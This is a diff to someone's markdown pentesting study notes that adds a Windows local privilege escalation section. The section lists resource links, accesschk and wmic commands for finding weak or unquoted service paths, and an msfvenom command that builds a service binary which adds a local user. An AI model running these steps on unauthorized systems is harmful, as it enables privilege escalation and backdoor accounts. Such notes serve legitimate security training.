@@ -292,7 +292,32 @@ Use /etc/passwd and /etc/shadow
 
 ## Tunneling and Port Forwarding
 
-## Privilege Escalation
+## Local Privilege Escalation
+
+### Rescources
+https://guif.re/windowseop
+https://sushant747.gitbooks.io/total-oscp-guide/post_exploitation.html
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Windows.pdf
+https://www.fuzzysecurity.com/tutorials/16.html
+https://gist.github.com/sckalath/8dacd032b65404ef7411
+Exploit Suggester scripts(kernel)
+
+### Windows
+
+#### Services
+`accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in users group
+`accesschk64.exe -wuvc [service]` - checks permissions on service 
+Example had you look for SERVICE_CHANGE_CONFIG to be writeable so we could change binpath
+
+
+`wmic service get name,pathname,startmode` - find unquoted file paths for services
+`msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service
+
+#### Autorun
+We're looking for execeutables that are automaticaly executed on some event (logon tab for autorun). Hopefully one of these executables has had poor misconfigurations for permissionsC
+
+### Linux
 
 ## Buffer Overflow
 
